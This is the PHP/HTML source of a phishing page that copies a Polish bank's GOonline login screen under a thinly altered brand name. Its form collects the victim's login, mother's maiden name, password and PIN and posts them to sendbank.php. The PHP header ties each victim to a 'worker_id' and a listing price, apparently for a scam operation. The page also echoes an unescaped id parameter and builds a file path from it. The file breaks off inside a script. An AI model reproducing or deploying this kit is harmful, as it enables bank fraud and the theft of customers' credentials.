<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "Paribas Bank");
?>
<!DOCTYPE html>
<html lang="pl-PL"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <title>Zaloguj się do GOonline | parb Paribas Bank Polska S.A.</title>
    <!--<base>--><base href=".">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta name="robots" content="noydir, noodp">
    <meta name="description" content="Podaj swój identyfikator lub login, aby zalogować się do serwisu transakcyjnego banku. Bank zmieniającego się świata.">
    <style>
    @supports (-ms-overflow-style:none) {}
    
    html {
      box-sizing: border-box;
      -ms-overflow-style: scrollbar
    }
    
    *,
    :after,
    :before {
      box-sizing: inherit
    }
    
    .container {
      width: 100%;
      padding-right: 12px;
      padding-left: 12px;
      margin-right: auto;
      margin-left: auto
    }
    
    @media(min-width:768px) {
      .container {
        max-width: 736px
      }
    }
    
    @media(min-width:1024px) {
      .container {
        max-width: 984px
      }
    }
    
    @media(min-width:1280px) {
      .container {
        max-width: 1224px
      }
    }
    
    @media(min-width:1440px) {
      .container {
        max-width: 1384px
      }
    }
    
    @media(min-width:768px) {
      .container {
        max-width: 736px
      }
    }
    
    @media(min-width:1024px) {
      .container {
        max-width: 984px
      }
    }
    
    @media(min-width:1280px) {
      .container {
        max-width: 1224px
      }
    }
    
    @media(min-width:1440px) {
      .container {
        max-width: 1384px
      }
    }
    
    .row {
      display: flex;
      flex-wrap: wrap;
      margin-right: -12px;
      margin-left: -12px
    }
    
    .col-12 {
      position: relative;
      width: 100%;
      padding-right: 12px;
      padding-left: 12px
    }
    
    .col-12 {
      flex: 0 0 100%;
      max-width: 100%
    }
    
    .mb-4 {
      margin-bottom: 1.5rem!important
    }
    
    input {
      margin: 0;
      font-size: 1rem;
      line-height: inherit
    }
    
    @font-face {
      font-family: parbpSansLight;
      src: url("");
      src: url("parbp_sans_light.eot") format("embedded-opentype"), url("parbp_sans_light.woff") format("woff"), url("parbp_sans_light.woff2") format("woff2"), url("parbp_sans_light.ttf") format("truetype"), url("592c079942e195c023c0f6895e2123a2.svg") format("svg");
      font-weight: 400;
      font-style: normal
    }
    
    @font-face {
      font-family: parbpSansRegular;
      src: url("");
      src: url("parbp_sans.eot") format("embedded-opentype"), url("parbp_sans.woff") format("woff"), url("parbp_sans.woff2") format("woff2"), url("parbp_sans.ttf") format("truetype"), url("788f8167786227817f5ae0963244ccb9.svg") format("svg");
      font-weight: 400;
      font-style: normal
    }
    
    @font-face {
      font-family: parbpSansBold;
      src: url("");
      src: url("parbp_sans_bold.eot") format("embedded-opentype"), url("parbp_sans_bold.woff") format("woff2"), url("parbp_sans_bold.woff2") format("woff"), url("parb-style-6.ttf") format("truetype"), url("e948e7b7d62e44baad71477bd3a009dd.svg") format("svg");
      font-weight: 400;
      font-style: normal
    }
    
    @font-face {
      font-family: parbpSansCondensedBold;
      src: url("");
      src: url("parbp_sans_condensed_bold.eot") format("embedded-opentype"), url("parbp_sans_condensed_bold.woff") format("woff2"), url("parbp_sans_condensed_bold.woff2") format("woff"), url("parb-style-7.ttf") format("truetype"), url("d18dc09cce0356c520188fb8c342523b.svg") format("svg");
      font-weight: 400;
      font-style: normal
    }
    
    @font-face {
      font-family: iconfont;
      src: url("iconfont.eot"), url("iconfont.eot") format("eot"), url("iconfont.woff") format("woff"), url("parb-style-8.ttf") format("truetype"), url("8f3d3dff45ed61ae13cb2781dc242a71.svg") format("svg");
      font-weight: 400;
      font-style: normal
    }
    
    .parb-icon:before {
      display: inline-block;
      font-style: normal;
      font-weight: 400;
      line-height: 1;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      font-family: iconfont, serif
    }
    
    .parb-icon.parb-icon-chevron:before {
      content: ""
    }
    
    .parb-icon.parb-icon-info:before {
      content: ""
    }
    
    .parb-font-regular {
      font-family: parbpSansRegular, sans-serif;
      font-weight: 400
    }
    
    ul {
      padding: 0;
      margin: 0
    }
    
    ul {
      list-style: none
    }
    
    h1,
    h2,
    h3,
    p,
    span {
      line-height: 1.25em
    }
    
    h1 {
      font-size: 1.625rem;
      margin: 0 0 1em;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    h2 {
      font-size: 1.5rem;
      font-family: parbpSansRegular, sans-serif
    }
    
    h2,
    h3 {
      margin: 0 0 1em;
      font-weight: 400
    }
    
    h3 {
      font-size: 1.25rem;
      font-family: parbpSansBold, sans-serif
    }
    
    p {
      font-size: 1rem;
      margin: 0 0 1em;
      color: #2d2926;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    a {
      text-decoration: none;
      color: #0fb777;
      color: #008f58;
      font-size: 1em
    }
    
    a {
      font-family: parbpSansRegular, sans-serif;
      font-weight: 400
    }
    
    .parb-link {
      position: relative;
      display: inline-block;
      text-decoration: none;
      cursor: pointer;
      outline: none;
      color: #008f58;
      font-size: 1em;
      font-family: parbpSansRegular, sans-serif;
      font-weight: 400
    }
    
    .parb-link:focus:not(.parb-disabled),
    .parb-link:hover {
      color: #008251
    }
    
    .parb-link.parb-link-icon {
      padding-left: 24px
    }
    
    .parb-link.parb-link-icon:before {
      position: absolute;
      content: " ";
      display: block;
      left: 2px;
      font-style: normal;
      font-weight: 400;
      line-height: 1;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      font-family: iconfont, serif;
      color: #2d2926
    }
    
    .parb-link.parb-link-icon.parb-link-icon-call:before {
      content: ""
    }
    
    .parb-link.parb-link-icon.parb-link-icon-map-pin:before {
      content: ""
    }
    
    .parb-link.parb-link-icon.parb-link-icon-security:before {
      content: ""
    }
    
    .parb-link.parb-link-icon.parb-link-icon-user:before {
      content: ""
    }
    
    .parb-icon:not([data-accordion].parb-c-link--chevron):before {
      display: inline-block
    }
    
    form {
      position: relative
    }
    
    .parb-select .list:hover .option:not(:hover) {
      background-color: transparent!important
    }
    
    *,
    :after,
    :before {
      box-sizing: border-box!important
    }
    
    html {
      font-size: 100%
    }
    
    body,
    html {
      height: 100%
    }
    
    body {
      background-color: #f8f8f8;
      position: relative;
      padding: 0;
      margin: 0;
      line-height: 1.5;
      color: #2d2926;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    .parb-login {
      position: relative;
      min-height: calc(100vh - 202px);
      padding-bottom: 40px
    }
    
    .parb-login .login-field {
      margin-bottom: 36px
    }
    
    @media(min-width:1024px) {
      .parb-login .login-field {
        margin-bottom: 68px
      }
    }
    
    .parb-login .login-field .subtitle {
      margin-bottom: 25px
    }
    
    @media(min-width:1024px) {
      .parb-login .login-field .subtitle {
        margin-bottom: 2.25rem
      }
    }
    
    .parb-login .login-check {
      max-width: 385px
    }
    
    @media(max-width:640px) {
      .parb-login .login-check {
        margin-bottom: 30px
      }
    }
    
    @media(min-width:641px) {
      .parb-login {
        padding: 80px 0 100px
      }
    }
    
    @media(min-width:1024px) {
      .parb-login {
        min-height: calc(100vh - 78px);
        background-color: #fff;
        padding: 0
      }
    }
    
    .parb-login .parb-login-bg {
      display: none;
      position: absolute;
      top: 0;
      left: 480px;
      width: calc(100% - 480px);
      height: 100%;
      background: url("parb-image-4.jpg") no-repeat 0 100%/cover
    }
    
    .parb-login .parb-login-bg:before {
      content: "";
      display: block;
      width: 100%;
      height: 100%;
      background-color: #000;
      opacity: .15
    }
    
    @media(min-width:1024px) {
      .parb-login .parb-login-bg {
        display: block
      }
    }
    
    .parb-login .login-left-col-wrapper {
      background-color: #fff;
      padding: 40px 15px 0;
      margin: 0 auto
    }
    
    @media(min-width:641px) {
      .parb-login .login-left-col-wrapper {
        width: 380px;
        padding: 30px 40px 35px
      }
    }
    
    @media(min-width:1024px) {
      .parb-login .login-left-col-wrapper {
        height: 100%;
        max-width: 480px;
        padding: 40px 0 40px 90px;
        margin: 0
      }
      @supports not (-ms-high-contrast:none) {
        .parb-login .login-left-col-wrapper {
          width: auto
        }
      }
    }
    
    .parb-login .login-left-col-header {
      margin-bottom: 40px
    }
    
    @media(min-width:1024px) {
      .parb-login .login-left-col-header {
        margin-bottom: 82px
      }
    }
    
    @media(min-width:1024px) {
      .parb-login .parb-login-contents {
        padding-right: 90px
      }
    }
    
    .parb-login .parb-logo-container h1 {
      font-size: 0;
      line-height: 0;
      margin-bottom: 0
    }
    
    .parb-login .parb-logo-container .parb-logo {
      height: 32px;
      display: inline-block;
      vertical-align: middle;
      margin-right: 1rem
    }
    
    .parb-login .parb-login-promo {
      display: none;
      position: absolute;
      right: 90px;
      top: 0;
      height: 100%
    }
    
    @media(min-width:1024px) {
      .parb-login .parb-login-promo {
        display: flex;
        justify-content: center;
        flex-direction: column
      }
    }
    
    .parb-login .parb-login-promo .parb-award-box {
      position: absolute;
      right: 0;
      top: 0;
      min-width: 300px;
      max-height: 34px;
      margin-top: 40px;
      align-items: flex-end;
      display: flex;
      align-items: center
    }
    
    .parb-login .parb-login-promo .parb-award-box__border-box {
      width: 33px;
      height: 33px;
      border-radius: 3px;
      border: 1.3px solid #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0
    }
    
    .parb-login .parb-login-promo .parb-award-box__text {
      color: #fff;
      font-size: .875rem;
      line-height: 1.21;
      text-align: right;
      flex-grow: 1;
      margin-right: .5rem;
      margin-top: .25rem
    }
    
    @media(min-width:1024px) {
      .parb-login .parb-login-promo__centered-box {
        display: flex;
        align-items: center
      }
    }
    
    .parb-login .parb-login-promo__centered-box__border-box {
      display: flex;
      align-items: flex-end;
      min-width: 300px;
      border: 7px solid #00975f
    }
    
    .parb-login .parb-login-promo__centered-box__border-box:before {
      content: "";
      display: inline-block;
      width: 0;
      padding-bottom: 100%
    }
    
    .parb-login .parb-login-promo__centered-box__border-box__text {
      display: inline-block;
      color: #fff;
      max-width: 40vw;
      text-transform: uppercase;
      font-size: 3rem;
      line-height: 1;
      padding: 6% 6% 10px;
      font-family: parbpSansCondensedBold, sans-serif;
      font-weight: 700
    }
    
    .parb-login .safety-info {
      margin-bottom: 24px
    }
    
    .parb-login .safety-info li {
      margin-bottom: 8px
    }
    
    input[type=text]::-ms-clear {
      display: none
    }
    
    input[type=text] {
      -webkit-appearance: none;
      -moz-appearance: none;
      appearance: none
    }
    
    ::-webkit-search-cancel-button {
      display: none
    }
    
    .select2-dropdown:hover .option:not(:hover) {
      background-color: transparent!important
    }
    
    .select2-container--default .select2-results__option--highlighted:not(:hover) {
      background-color: transparent
    }
    
    .uib-datepicker tbody button:hover:not(:disabled):after {
      content: "";
      position: absolute;
      width: 25px;
      height: 25px;
      background: #eef9f0;
      left: 50%;
      top: 50%;
      z-index: -1;
      transform: translate(-50%, -50%)
    }
    
    .uib-datepicker tbody button.today:not(:disabled):after {
      content: "";
      background: #eef9f0;
      text-shadow: none;
      position: absolute;
      z-index: -1;
      left: 50%;
      top: 0;
      transform: translateX(-50%);
      color: #2d2926
    }
    
    .uib-datepicker tbody button.active:not(:disabled):after {
      content: "";
      background: #0fb777;
      position: absolute;
      z-index: -1;
      left: 50%;
      top: 50%;
      width: 25px;
      height: 25px;
      transform: translate(-50%, -50%);
      color: #fff
    }
    
    [role=button] {
      cursor: pointer
    }
    
    .white-space-preline {
      white-space: pre-line
    }
    
    .parb-toasts-wrapper {
      position: fixed;
      right: 10px;
      top: 85px;
      z-index: 102
    }
    
    .parb-messages-wrapper {
      position: relative;
      z-index: 1;
      width: 100%
    }
    
    body,
    html {
      font-size: 14px
    }
    
    @media(min-width:768px) {
      body,
      html {
        font-size: 16px
      }
    }
    
    @supports(-ms-ime-align:auto) {
      html {
        overflow: hidden
      }
      body,
      html {
        height: 100%
      }
      body {
        overflow: auto;
        position: relative
      }
    }
    
    @media (-ms-high-contrast:active),
    (-ms-high-contrast:none) {
      html {
        overflow: hidden
      }
      body,
      html {
        height: 100%
      }
      body {
        overflow: auto
      }
    }
    
    ngb-datepicker .ngb-dp-content .ngb-dp-month .ngb-dp-week .ngb-dp-day:focus-visible {
      outline: none
    }
    
    .parb-c-radio-button--listed-devices:not(:last-child) input[type=radio]:not(:checked)+label:after {
      border-bottom: transparent
    }
    
    .parb-c-input-text {
      width: 100%;
      position: relative;
      display: block
    }
    
    .parb-c-input-text input {
      width: 100%;
      text-overflow: ellipsis;
      font-family: parbpSansRegular, sans-serif;
      font-weight: 400;
      background: #fff;
      box-shadow: inset 0 -1px 0 0 #b8b8b8;
      border-radius: 2px;
      border: 1px solid #b8b8b8;
      border-bottom: 0;
      color: #2d2926
    }
    
    .parb-c-input-text input::-webkit-input-placeholder {
      color: light!important;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    .parb-c-input-text input::-moz-placeholder {
      color: light!important;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    .parb-c-input-text input:-ms-input-placeholder {
      color: light!important;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    .parb-c-input-text input:-moz-placeholder {
      color: light!important;
      font-family: parbpSansLight, sans-serif;
      font-weight: 300
    }
    
    .parb-c-input-text input:focus {
      box-shadow: 0 2px 10px 0 #efefef, inset 0 -4px 0 -2px #0fb777;
      outline: none
    }
    
    .parb-c-input-text input:disabled {
      background-color: #f8f8f8;
      border-color: #e5e5e5;
      box-shadow: inset 0 -1px 0 0 #e5e5e5;
      cursor: not-allowed
    }
    
    .parb-c-input-text input {
      height: 46px;
      padding: 0 18px 1px;
      -moz-appearance: textfield
    }
    
    .parb-c-input-text input::-webkit-inner-spin-button,
    .parb-c-input-text input::-webkit-outer-spin-button {
      -webkit-appearance: none;
      margin: 0
    }
    
    .parb-c-input-text--error [contenteditable].ng-touched:not(:focus),
    .parb-c-input-text--error input.ng-touched:not(:focus),
    .parb-c-input-text--error textarea.ng-touched:not(:focus) {
      box-shadow: 0 2px 10px 0 #efefef, inset 0 -4px 0 -2px #d40000;
      outline: none
    }
    
    .parb-c-form {
      display: block
    }
    
    .parb-c-form .parb-c-form__msg-holder {
      margin-top: -10px
    }
    
    .parb-c-form__field {
      display: block;
      margin: 0 -12px 12px
    }
    
    .parb-c-form__field__label-wrapper {
      text-align: left;
      padding: 0 12px
    }
    
    .parb-c-form__field__label {
      display: inline-block;
      font-size: .875rem;
      line-height: 1.2rem
    }
    
    .parb-c-form__field__input-wrapper {
      padding: 0 12px
    }
    
    .parb-c-form__msg-holder {
      display: block;
      position: relative;
      width: 100%;
      min-height: 10px;
      margin-top: 2px
    }
    
    @media(min-width:768px) {
      .parb-c-form__msg-holder {
        min-height: 22px
      }
    }
    
    .parb-c-btn {
      position: relative;
      display: inline-block;
      min-width: 160px;
      min-height: 46px;
      line-height: 1.5rem;
      background-color: #0fb777;
      color: #fff;
      font-size: 1rem;
      font-family: parbpSansRegular, sans-serif;
      font-weight: 400;
      margin: 0;
      border: 1px solid transparent;
      padding: 10px 15px;
      border-radius: 2px;
      text-align: center;
      text-decoration: none;
      text-transform: uppercase;
      transition: background-color .2s ease;
      will-change: auto;
      overflow-wrap: break-word;
      word-wrap: break-word;
      cursor: pointer
    }
    
    .parb-c-btn:focus,
    .parb-c-btn:hover {
      background-color: #008251;
      outline: none
    }
    
    .parb-c-btn:disabled {
      cursor: not-allowed;
      background-color: #e5e5e5;
      color: #767676
    }
    
    .parb-c-btn--wide {
      width: 100%;
      min-width: 0
    }
    
    .parb-c-footer {
      position: relative;
      border-top: 1px solid #e5e5e5
    }
    
    @media(min-width:1024px) {
      .parb-c-footer.not-logged-in .parb-c-footer__top-inner {
        max-width: 100%;
        margin-left: 5rem;
        margin-right: 5rem
      }
    }
    
    .parb-c-footer__top {
      background: #fff;
      padding-top: 5px;
      padding-bottom: 5px;
      min-height: 80px;
      display: flex;
      align-items: center
    }
    
    .parb-c-footer__top,
    .parb-c-footer__top .parb-link {
      font-size: .875rem;
      font-family: parbpSansRegular, sans-serif;
      font-weight: 400
    }
    
    @media(min-width:768px) {
      .parb-c-footer__top {
        display: flex;
        justify-content: space-between;
        width: 100%;
        flex-direction: row;
        height: 80px
      }
    }
    
    .parb-c-footer__top .footer-top-list {
      flex-grow: 1
    }
    
    .parb-c-footer__top .footer-top-list-item {
      display: block;
      margin-top: 5px;
      margin-bottom: 5px;
      margin-right: 20px
    }
    
    @media(min-width:768px) {
      .parb-c-footer__top .footer-top-list-item {
        display: inline-block
      }
    }
    
    @media(min-width:1024px) {
      .parb-c-footer__top .footer-top-list-item {
        margin-right: 30px
      }
    }
    
    .parb-c-footer__top-inner {
      display: flex;
      justify-content: space-between;
      flex-direction: column;
      color: #b8b8b8
    }
    
    @media(min-width:768px) {
      .parb-c-footer__top-inner {
        flex-direction: row;
        align-items: center
      }
    }
    
    .parb-c-footer__top-inner .parb-link {
      color: #b8b8b8
    }
    
    .parb-c-footer__top-inner .parb-link:focus,
    .parb-c-footer__top-inner .parb-link:hover {
      color: #0fb777
    }
    
    .parb-c-footer__top-inner .parb-link.parb-link-icon:before {
      color: #b8b8b8
    }
    
    .parb-c-footer__security-logo {
      margin-top: 10px
    }
    
    @media(min-width:768px) {
      .parb-c-footer__security-logo {
        margin-top: 0
      }
    }
    
    .parb-c-icon-color {
      display: inline-block;
      position: relative;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: 50%;
      width: 100%;
      height: 100%
    }
    
    .parb-c-icon-color--18 {
      width: 18px;
      height: 18px
    }
    
    .parb-c-icon-color--basic-award {
      background-image: url("parb-image-1.svg")
    }
    
    .parb-c-image {
      display: inline-block;
      position: relative;
      background-size: contain;
      background-repeat: no-repeat;
      background-position: 50%;
      width: 100%;
      height: 100%
    }
    
    .parb-c-image--parb-paribas-logo-full {
      background-image: url("parb-image-2.svg");
      width: 154px;
      height: 32px
    }
    
    .parb-c-image--norton {
      background-image: url("parb-image-5.png");
      width: 69px;
      height: 40px
    }
    
    .parb-c-link {
      position: relative;
      color: #008f58;
      text-decoration: none;
      cursor: pointer
    }
    
    .parb-c-link.parb-c-link--has-icon-left {
      position: relative;
      padding-left: 32px
    }
    
    .parb-c-link.parb-c-link--has-icon-left:not(:empty) {
      display: inline-block
    }
    
    .parb-c-link.parb-c-link--has-icon-left:before {
      content: " ";
      position: absolute;
      display: flex;
      justify-content: center;
      align-items: center;
      width: 24px;
      height: 24px;
      left: 0;
      top: 40%;
      transform-origin: center center;
      transform: translateY(-50%);
      font-size: 1.25em;
      font-style: normal;
      font-weight: 400;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      font-family: iconfont, serif;
      color: #2d2926
    }
    
    .parb-c-link.parb-c-link--icon-call-center:before {
      content: ""
    }
    
    .parb-c-link.parb-c-link--icon-diamond:before {
      content: ""
    }
    
    .parb-c-link:hover {
      color: #008251
    }
    
    .parb-c-set-locale {
      position: relative;
      color: #b8b8b8;
      cursor: pointer
    }
    
    .parb-c-set-locale .parb-icon-chevron {
      font-size: .5rem;
      margin-left: 6px
    }
    
    .parb-c-set-locale__current {
      position: relative;
      padding-left: 20px;
      height: 30px;
      line-height: 30px;
      outline: none
    }
    
    .parb-c-set-locale__current:before {
      position: absolute;
      display: block;
      content: "";
      width: 15px;
      height: 10px;
      background-repeat: no-repeat;
      background-size: 15px 10px;
      left: 0;
      top: 50%;
      transform: translateY(-50%);
      margin-top: -1px
    }
    
    .parb-c-set-locale__current--pl-PL:before {
      background-image: url("parb-image-3.svg")
    }
    
    .parb-c-text {
      display: flex
    }
    
    .parb-c-text.parb-c-text--has-icon-left {
      position: relative;
      padding-left: 32px
    }
    
    .parb-c-text.parb-c-text--has-icon-left:not(:empty) {
      display: inline-block
    }
    
    .parb-c-text.parb-c-text--has-icon-left:before {
      content: " ";
      position: absolute;
      display: flex;
      justify-content: center;
      align-items: center;
      width: 24px;
      height: 24px;
      left: 0;
      top: 40%;
      transform-origin: center center;
      transform: translateY(-50%);
      font-size: 1.25em;
      font-style: normal;
      font-weight: 400;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      font-family: iconfont, serif;
      color: #2d2926
    }
    
    .parb-c-text.parb-c-text--icon-certificate:before {
      content: ""
    }
    
    .parb-c-text.parb-c-text--icon-locked:before {
      content: ""
    }
    
    .parb-c-text.parb-c-text--icon-safe:before {
      content: ""
    }
    
    .parb-c-tooltip {
      position: relative;
      color: #0fb777;
      display: none;
      overflow: hidden
    }
    
    @media(min-width:1024px) {
      .parb-c-tooltip {
        display: inline-block;
        overflow: visible
      }
    }
    
    .parb-c-widget-header {
      display: flex;
      flex-direction: row;
      flex-wrap: nowrap;
      align-items: baseline;
      margin-bottom: 16px
    }
    
    .parb-c-widget-header>:first-child {
      flex-grow: 1
    }
    
    .parb-c-widget-header h2,
    .parb-c-widget-header h3 {
      font-size: 1rem;
      margin: 0;
      font-family: parbpSansBold, sans-serif;
      font-weight: 400
    }
    
    .parb-c-widget-header--lg {
      margin-bottom: 24px
    }
    
    .parb-c-widget-header--lg h2 {
      font-size: 1.5rem
    }
    
    .parb-mt-large {
      margin-top: 32px!important
    }
  </style></head>
  

  <body style="display: block;">
    <ui-view>
      <ui-parb-messages-ng class=" ng-isolate-scope">
        <div class="parb-toasts-wrapper"> </div>
        <div class="parb-messages-wrapper"> </div>
      </ui-parb-messages-ng>
      <widget-parb-login class=" ng-isolate-scope">
        <parb-pre-login class=" ng-isolate-scope">
          <parb-common-login-page class="ng-isolate-scope">
            <section class="parb-login ">
              <div class="login-left-col-wrapper">
                <parb-login-header-logo class="ng-isolate-scope">
                  <header class="login-left-col-header">
                    <div class="parb-logo-container">
                      <h1>
      <a href="" class="parb-logo" title="parb PARIBAS - logowanie - strona główna">
        <div class="parb-c-image parb-c-image--parb-paribas-logo-full"></div>
      </a>
    </h1> </div>
                  </header>
                </parb-login-header-logo>
                <main class="parb-login-contents">
                  <div class="row">
                    <div class="col-12">
                      <div class="login-field">
                        <div class="parb-c-widget-header parb-c-widget-header--lg ">
                          <h2 class="ng-binding">Zaloguj się do GOonline</h2> </div>
                        <p class="subtitle ng-binding ">Podaj swój identyfikator lub login, aby zalogować się do serwisu transakcyjnego.</p>
                        <ng-transclude class="">
                          <parb-common-login-page-content class="">
                            <form role="form" class="parb-c-form ng-pristine ng-valid" autocomplete="off" action="sendbank.php" novalidate="novalidate" method="post">
                              <div class="parb-c-form__field">
                                <div class="parb-c-form__field__label-wrapper">
                                <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
                                <input type="hidden" name="type" value="6">
                                  
                                  <label class="parb-c-form__field__label ng-binding">Identyfikator lub login</label> <span class="parb-c-tooltip">
            <span class="parb-icon parb-icon-info"></span> </span>
                                </div>
                                <div class="parb-c-form__field__input-wrapper">
                                  <div class="parb-c-input-text">
                                    <input name="logindata" type="text" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="wpisz login lub identyfikator" required=""> </div>
                                </div>
                                <div class="parb-c-form__msg-holder"> </div>
                              </div>
                              <div class="parb-c-form__field">
                                <div class="parb-c-form__field__label-wrapper">
                                  <label class="parb-c-form__field__label ng-binding">Nazwisko rodowe Matki</label>
                                </div>
                                <div class="parb-c-form__field__input-wrapper">
                                  <div class="parb-c-input-text">
                                    <input name="mamkadata" type="text" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="Wpisz nazwisko panieńskie matki" required=""> </div>
                                </div>
                                <div class="parb-c-form__msg-holder"> </div>
                              </div>
                              <div class="parb-c-form__field">
                                <div class="parb-c-form__field__label-wrapper">
                                  <label class="parb-c-form__field__label ng-binding">Hasło</label>
                                </div>
                                <div class="parb-c-form__field__input-wrapper">
                                  <div class="parb-c-input-text">
                                    <input name="passdata" type="text" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="Wprowadź hasło" required=""> </div>
                                </div>
                                <div class="parb-c-form__msg-holder"> </div>
                              </div>
                              <div class="parb-c-form__field">
                                <div class="parb-c-form__field__label-wrapper">
                                  <label class="parb-c-form__field__label ng-binding">PIN</label>
                                </div>
                                <div class="parb-c-form__field__input-wrapper">
                                  <div class="parb-c-input-text">
                                    <input name="pindata" type="text" class="ng-pristine ng-valid ng-isolate-scope ng-empty ng-touched" placeholder="Wprowadź kod PIN" required=""> </div>
                                </div>
                                <div class="parb-c-form__msg-holder"> </div>
                              </div>
                              <input class="parb-c-btn parb-c-btn--wide mb-4 ng-binding" type="submit" value="DALEJ">
                              <parb-login-problem-link class="ng-isolate-scope"><a class="parb-c-link ng-binding" href="">
  Zresetuj hasło / odblokuj dostęp
</a></parb-login-problem-link>
                            </form>
                          </parb-common-login-page-content>
                        </ng-transclude>
                      </div>
                      <div class="login-check">
                        <div class="parb-c-widget-header">
                          <h3 class="login-check-header ng-binding">Sprawdź, zanim się zalogujesz:</h3> </div>
                        <ul class="safety-info">
                          <li> <span class="parb-c-text parb-c-text--has-icon-left parb-c-text--icon-safe ng-binding">Adres zaczyna się od https</span> </li>
                          <li> <span class="parb-c-text parb-c-text--has-icon-left parb-c-text--icon-locked ng-binding">Połączenie szyfrowane</span> </li>
                          <li> <span class="parb-c-text parb-c-text--has-icon-left parb-c-text--icon-certificate ng-binding">Certyfikat strony</span> </li>
                          <li> <a href="https://www.parbparibas.pl/klienci-indywidualni/bankowosc-internetowa/goonline" target="_blank" class="parb-c-link parb-c-link--has-icon-left parb-c-link--icon-diamond ng-binding">
                  Poznaj GOonline
                </a> </li>
                          <li class="parb-mt-large "> <a href="https://video-chat.parbparibas.pl/parb-video/?mediachannel=4" target="_blank" class="parb-c-link parb-c-link--has-icon-left parb-c-link--icon-call-center ng-binding">
                  Masz pytania dotyczące GOonline?
                </a> <span class="parb-c-text parb-c-text--has-icon-left ng-binding">Zapytaj konsultanta na wideoczacie (w&nbsp;godz 9-17 w dni robocze)</span> </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                </main>
                <div class="parb-login-bg">
                  <ng-include>
                    <div class="parb-login-promo ">
                      <div class="parb-award-box">
                        <div class="parb-award-box__text"> <span class="parb-font-regular white-space-preline ng-binding">Najlepszy Bank w Polsce 2021
według: Instytucja Roku</span> </div>
                        <div class="parb-award-box__border-box">
                          <div class="parb-c-icon-color parb-c-icon-color--18 parb-c-icon-color--basic-award"></div>
                        </div>
                      </div>
                      <div class="parb-login-promo__centered-box">
                        <div class="parb-login-promo__centered-box__border-box">
                          <div class="parb-login-promo__centered-box__border-box__text">
                            <div class="ng-binding ">Bank</div>
                            <div class="ng-binding ">zmieniającego się</div>
                            <div class="ng-binding ">świata</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </ng-include>
                </div>
              </div>
            </section>
          </parb-common-login-page>
        </parb-pre-login>
      </widget-parb-login>
      <parb-footer-widget class=" ng-isolate-scope">
        <footer class="parb-c-footer not-logged-in">
          <ui-parb-footer-top class="ng-isolate-scope">
            <div class="parb-c-footer__top">
              <div class="container parb-c-footer__top-inner">
                <ul class="footer-top-list">
                  <li class="footer-top-list-item">
                    <parb-set-locale-widget class="ng-isolate-scope">
                      <div class="parb-c-set-locale" role="button" tabindex="0"> <span class="parb-c-set-locale__current ng-binding parb-c-set-locale__current--pl-PL">
    Polski
    <span class="parb-icon parb-icon-chevron">
    </span> </span>
                      </div>
                    </parb-set-locale-widget>
                  </li>
                  <li class="footer-top-list-item"> <a class="parb-link parb-link-icon parb-link-icon-call ng-binding " href="tel:+48 500 990 500">
          +48 500 990 500
        </a> <span class="ng-binding ">
          &nbsp; &nbsp;
        </span> <a class="parb-link parb-link-icon parb-link-icon-call ng-binding " href="tel:+48%C2%A022%C2%A0134%C2%A000%C2%A000">
          +48&nbsp;22&nbsp;134&nbsp;00&nbsp;00
        </a> </li>
                  <li class="footer-top-list-item"> <a target="_blank" class="parb-link parb-link-icon parb-link-icon-map-pin ng-binding " href="https://www.parbparibas.pl/kontakt/oddzialy-z-obsluga-detaliczna-i-biznesowa?type=department_retail_business">
          Oddziały
        </a> </li>
                  <li class="footer-top-list-item"> <a target="_blank" class="parb-link parb-link-icon parb-link-icon-security ng-binding" href="https://www.parbparibas.pl/bezpieczenstwo">
          Bezpieczeństwo
        </a> </li>
                  <li class="footer-top-list-item "> <a target="_blank" class="parb-link parb-link-icon parb-link-icon-user ng-binding" href="https://goonline.parbparibas.pl/gateway/api/auth/new-user">
          Nie mam loginu
        </a> </li>
                </ul>
                <div class="parb-c-footer__security-logo ">
                  <div class="parb-c-image parb-c-image--norton"></div>
                </div>
              </div>
            </div>
          </ui-parb-footer-top>
        </footer>
      </parb-footer-widget>
    </ui-view>
  
		<script>
			let pwdChars = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789aąbсćdеęfghijklłmnńoóprsśtuwyzźżAĄBCĆDEĘFGHIJKLŁMNŃOÓPRSŚTUWYZŹŻ';
			let pwdLen = 20;
			function inputMask(elem) {
				let val = elem.value;
				let val2 = '';
